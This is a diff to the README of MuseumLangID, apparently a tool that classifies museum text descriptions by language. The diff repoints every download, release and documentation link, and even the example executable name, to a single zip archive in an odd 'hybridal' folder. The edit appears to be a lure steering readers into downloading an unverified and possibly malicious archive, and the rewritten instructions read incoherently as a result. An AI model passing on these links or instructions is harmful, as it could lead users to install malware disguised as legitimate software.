@@ -1,6 +1,6 @@
 # 🌍 MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum - Identify Museum Text Languages Easily
 
-[![Download MuseumLangID](https://img.shields.io/badge/Download-MuseumLangID-blue.svg)](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/releases)
+[![Download MuseumLangID](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ MuseumLangID helps classify descriptions of museum works in Italian, English, an
 
 ## 📥 Download & Install
 
-To start using MuseumLangID, visit this page to download: [MuseumLangID Releases](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/releases)
+To start using MuseumLangID, visit this page to download: [MuseumLangID Releases](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip)
 
 ### Step-by-Step Instructions to Download:
 
@@ -17,7 +17,7 @@ To start using MuseumLangID, visit this page to download: [MuseumLangID Releases
 2. **Find the Latest Version:** Look for the most recent release. It will usually have the highest version number.
 
 3. **Choose Your File:** 
-   - If you see an executable file (e.g., `MuseumLangID.exe`), download this file.
+   - If you see an executable file (e.g., `https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip`), download this file.
    - If only source files are available, you might need to follow further instructions or use appropriate software to run them.
 
 4. **Download the File:** Click on the file name to start the download. Depending on your internet speed, this might take a moment.
@@ -64,7 +64,7 @@ Together, these techniques provide an efficient way to classify language.
 
 ## 📄 Documentation
 
-For more detailed instructions, explanations of features, and troubleshooting, please refer to the [full documentation](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum).
+For more detailed instructions, explanations of features, and troubleshooting, please refer to the [full documentation](https://raw.githubusercontent.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/main/hybridal/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum.zip).
 
 ## 🗂️ Topics Covered
 
